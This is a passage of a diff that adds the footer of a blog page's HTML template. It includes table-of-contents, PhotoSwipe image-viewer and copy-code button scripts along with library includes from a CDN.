+      showCursor: true
+    });
+  } catch (err) {
+    console.log(err)
+  }
+</script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom -->
+
+
+<script src="/js/clickBoom.js"></script>
+
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+
+    
+  </div>
+</body>
+
+</html>
